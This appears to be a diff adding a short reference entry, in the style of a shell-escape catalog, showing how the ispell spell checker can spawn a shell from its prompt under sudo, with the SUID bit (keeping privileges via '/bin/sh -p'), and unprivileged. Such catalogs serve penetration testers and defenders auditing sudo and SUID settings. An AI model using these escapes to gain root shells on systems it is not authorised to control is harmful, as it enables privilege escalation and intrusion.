@@ -1,0 +1,17 @@
+ispell
+======
+
+Shell
+-----
+
+[Sudo]
+    ispell /etc/hosts
+!/bin/sh
+
+[SUID]
+    ispell /etc/hosts
+!/bin/sh -p
+
+[Unprivileged]
+    ispell /etc/hosts
+!/bin/sh
